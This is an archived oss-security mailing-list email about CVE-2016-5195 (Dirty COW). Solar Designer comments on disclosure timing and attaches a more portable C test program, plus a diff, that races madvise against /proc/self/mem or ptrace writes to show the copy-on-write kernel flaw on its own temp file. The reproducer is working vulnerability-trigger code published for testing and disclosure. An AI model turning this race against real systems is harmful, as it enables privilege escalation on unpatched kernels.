X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["8056" "Sunday" "30" "October" "2016" "06:35:57" "+0100" "Solar Designer" "solar@openwall.com" "<20161030053557.GA3024@openwall.com>" "327" "Re: [oss-security] CVE-2016-5195 test case" nil nil nil "10" "2016103005:35:57" "[oss-security] CVE-2016-5195 test case" (number mark "U       solar@openwa Oct 30  327/8056  " thread-indent "\"Re: [oss-security] CVE-2016-5195 test case\"\n") "<CALCETrUyZyOgMNC7sN0s6+jfzZbou+butapbyu-PFev3GJgiww@mail.gmail.com>" ("<CALCETrUyZyOgMNC7sN0s6+jfzZbou+butapbyu-PFev3GJgiww@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 26048 invoked by uid 550); 30 Oct 2016 05:37:04 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 25898 invoked from network); 30 Oct 2016 05:36:49 -0000
Date: Sun, 30 Oct 2016 06:35:57 +0100
From: Solar Designer <solar@openwall.com>
To: oss-security@lists.openwall.com
Message-ID: <20161030053557.GA3024@openwall.com>
References: <CALCETrUyZyOgMNC7sN0s6+jfzZbou+butapbyu-PFev3GJgiww@mail.gmail.com>
Mime-Version: 1.0
Content-Type: multipart/mixed; boundary="UugvWAfsgieZRqgk"
Content-Disposition: inline
In-Reply-To: <CALCETrUyZyOgMNC7sN0s6+jfzZbou+butapbyu-PFev3GJgiww@mail.gmail.com>
User-Agent: Mutt/1.4.2.3i
Subject: Re: [oss-security] CVE-2016-5195 test case

--UugvWAfsgieZRqgk
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

Hi Andy,

On Thu, Oct 27, 2016 at 08:35:01AM -0700, Andy Lutomirski wrote:
> I sat on this longer than makes any sense given how easy to reproduce
> CVE-2016-5195 is, but here's a reasonably portable reproducer.  It's
> intended to have no side effects, but your mileage may vary.
> 
> https://github.com/amluto/vulnerabilities/blob/master/others/CVE-2016-5195/test_CVE-2016-5195.c
> 
> This will use /proc/self/mem or ptrace automatically, and it's
> intended to be portable to a wide range of kernels.

Unfortunately, it still didn't work on systems without O_TMPFILE or/and
without a defined PR_SET_PTRACER_ANY.

Attached is a slightly more portable version.

> It's an improved
> version of the test case I originally sent out to distros (oops!).

Why "oops"?  Do you mean just the distros vs. linux-distros issue?

It's OK to send reproducers to the [linux-]distros list (the appropriate
one) as long as you intend to make them public shortly after public
disclosure of the issue itself (the earliest of: a few days or when
other public exploits/reproducers show up).  I think for most issues,
which are not high impact or/and where non-trivial pre-conditions need
to be met, it makes sense to make the (non-weaponized) reproducers
public right away (on the initial public disclosure date, along with
full vulnerability detail), but occasionally there will be issues like
this where delaying posting the reproducer a little bit makes sense.
It's just that I think you shouldn't have delayed as much.  Ideally, you
should have made a posting in here without the reproducer on the initial
public disclosure date (in fact, that's your responsibility per the
[linux-]distros list policy), and as others made reproducers available
within a day, you should have also posted yours the next day.

Just my opinion.

Thank you for your help in handling of this issue!

Alexander

--UugvWAfsgieZRqgk
Content-Type: text/x-c; charset=us-ascii
Content-Disposition: attachment; filename="test_CVE-2016-5195.c"

/*
 * Test that MAP_PRIVATE works right (CVE-2016-5195).
 *
 * Copyright (c) 2016 Andy Lutomirski.  All rights reserved.
 *
 * GPL v2
 *
 * Thanks to Ben Hutchings and Oleg Nesterov for some improvements.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <err.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <stdbool.h>
#include <stdint.h>
#include <unistd.h>
#include <pthread.h>
#include <stdlib.h>
#include <sys/syscall.h>
#include <sys/ptrace.h>
#include <sys/prctl.h>
#include <linux/prctl.h>
#include <signal.h>
#include <sys/wait.h>
#include <errno.h>
#include <string.h>

#ifndef PR_SET_PTRACER
#define PR_SET_PTRACER 0x59616d61
#endif

#ifndef PR_SET_PTRACER_ANY
#define PR_SET_PTRACER_ANY ((unsigned long)-1)
#endif

static long volatile *write_iters;
static volatile unsigned long ready;
static void *p_priv;
static volatile char *p_shared;
static int fd;

static const char one = 1;

static void *madvise_thread(void *ctx)
{
	while (!ready)
		;

	long madvise_iters = 0;

	while (true) {
		char a = p_shared[0];
		char b = p_shared[4096];
		if (a || b) {
			printf("+ PWNED %d,%d! (%ld writes per page, %ld madvise calls)\n",
			       (int)a, (int)b, *write_iters, madvise_iters);
			exit(0);
		}

		// This is optional.
		*(volatile char *)(p_priv);

		madvise(p_priv, 1, MADV_DONTNEED);
		madvise(p_priv + 4096, 1, MADV_DONTNEED);
		madvise_iters++;
	}
}

static void try_procmem(void)
{
	int procmem = open("/proc/self/mem", O_WRONLY, 0);
	if (procmem == -1 ) {
		printf("- Can't open /proc/self/mem\n");
		return;
	}

	char test = 0;
	pwrite(procmem, &one, 1, (off_t)&test);
	if (!test) {
		printf("- Cant write to /proc/self/mem\n");
		close(procmem);
		procmem = -1;
		return;
	}

	printf("+ Using /proc/self/mem\n");
	printf("  If the test gets stuck here forever, then you are probably not vulnerable.\n");
	ready = 1;

	while (true) {
		(*write_iters)++;
		pwrite(procmem, &one, 1, (off_t)p_priv);
		pwrite(procmem, &one, 1, (off_t)p_priv + 4096);
	}
}

static void ptrace_proc(pid_t parent)
{
	prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0, 0);

	munmap(p_priv, 8192);  /* We're done with our copy. */

	if (ptrace(PTRACE_ATTACH, parent, NULL, NULL) != 0)
		err(1, "PTRACE_ATTACH");

	int status;
	waitpid(parent, &status, __WALL);
	if (!WIFSTOPPED(status)) {
		printf("- ptrace child is in the wrong state\n");
		exit(1);
	}

	printf("+ ptrace is attached\n");

	printf("  If the test gets stuck here forever, then you are probably not vulnerable.\n");

	unsigned long oneul = 1;
	if (ptrace(PTRACE_POKEDATA, parent, &ready, &oneul) != 0)
		err(1, "PTRACE_POKEDATA for ready");

	while (true) {
		(*write_iters)++;
		unsigned long word = (unsigned long)0x0101010101010101ULL;
		if (ptrace(PTRACE_POKEDATA, parent, p_priv, (void *)word) != 0) {
			if (errno == ESRCH)
				goto sleep_forever;
			err(1, "PTRACE_POKEDATA");
		}
		if (ptrace(PTRACE_POKEDATA, parent, (char *)p_priv + 4096, (void *)word) != 0) {
			if (errno == ESRCH)
				goto sleep_forever;
			err(1, "PTRACE_POKEDATA");
		}
	}

sleep_forever:
	/*
	 * Don't exit lest we confuse the parent -- we'll get cleaned up
	 * by the death signal.
	 */
	while (true)
		pause();
}

/* Separate thread to avoid breaking job control */
static void *ptrace_thread(void *unused)
{
	pid_t parent = syscall(SYS_gettid);
	prctl(PR_SET_PTRACER, PR_SET_PTRACER_ANY, 0, 0, 0);
	pid_t child = fork();
	prctl(PR_SET_DUMPABLE, 1, 0, 0, 0, 0);

	if (child < 0) {
		err(1, "fork");
	} else if (!child) {
		ptrace_proc(parent);
	}

	ready = 1;

	while (true)
		pause();
}

static void try_ptrace(void)
{
	pthread_t t;
	int status;

	pthread_create(&t, NULL, ptrace_thread, NULL);

	while (wait(&status) < 0)
		;

	printf("- ptracer child exited\n");
}

int main(int argc, char **argv)
{
	fd = -1;
#ifdef O_TMPFILE
	fd = open(".", O_TMPFILE | O_RDWR, 0700);
#else
	errno = EISDIR;
#endif
	if (fd != -1) {
		printf("+ Using O_TMPFILE\n");
	} else {
		char tmp_name[30] = "test_CVE-2016-5195-XXXXXX";
		if (errno != EISDIR) {
			warn("O_TMPFILE");
			printf("- Make sure you run this test in a writable directory\n");
			exit(1);
		}
		fd = mkstemp(tmp_name);
		if (fd == -1) {
			warn("mkstemp");
			printf("- Make sure you run this test in a writable directory\n");
			exit(1);
		}
		unlink(tmp_name);
		printf("+ Using a conventional temporary file\n");
	}
	if (ftruncate(fd, 8192) != 0)
		err(1, "ftruncate");

	// This hopefully reduces the risk of crashing the system.
	pwrite(fd, &one, 1, 8);
	pwrite(fd, &one, 1, 4096 + 8);

	write_iters = mmap(NULL, sizeof(unsigned long), PROT_READ | PROT_WRITE,
			   MAP_ANONYMOUS | MAP_SHARED, -1, 0);
	
	p_shared = mmap(NULL, 8192, PROT_READ, MAP_SHARED, fd, 0);
	if (p_shared == MAP_FAILED)
		err(1, "open");

	p_priv = mmap(NULL, 8192, PROT_READ, MAP_PRIVATE, fd, 0);
	if (p_priv == MAP_FAILED)
		err(1, "mmap");

	pthread_t t;
	pthread_create(&t, NULL, madvise_thread, NULL);

	if (argc != 2 || strcmp(argv[1], "ptrace"))
		try_procmem();
	try_ptrace();
	printf("No force-write means detected\n");

	return 0;
}

--UugvWAfsgieZRqgk
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="test_CVE-2016-5195.c.diff"

--- test_CVE-2016-5195.c.orig	2016-10-30 06:16:53 +0100
+++ test_CVE-2016-5195.c	2016-10-30 06:16:53 +0100
@@ -29,10 +29,14 @@
 #include <errno.h>
 #include <string.h>
 
-#ifndef PT_SET_PTRACER
+#ifndef PR_SET_PTRACER
 #define PR_SET_PTRACER 0x59616d61
 #endif
 
+#ifndef PR_SET_PTRACER_ANY
+#define PR_SET_PTRACER_ANY ((unsigned long)-1)
+#endif
+
 static long volatile *write_iters;
 static volatile unsigned long ready;
 static void *p_priv;
@@ -180,6 +184,8 @@
 	fd = -1;
 #ifdef O_TMPFILE
 	fd = open(".", O_TMPFILE | O_RDWR, 0700);
+#else
+	errno = EISDIR;
 #endif
 	if (fd != -1) {
 		printf("+ Using O_TMPFILE\n");
@@ -224,4 +230,6 @@
 		try_procmem();
 	try_ptrace();
 	printf("No force-write means detected\n");
+
+	return 0;
 }

--UugvWAfsgieZRqgk--
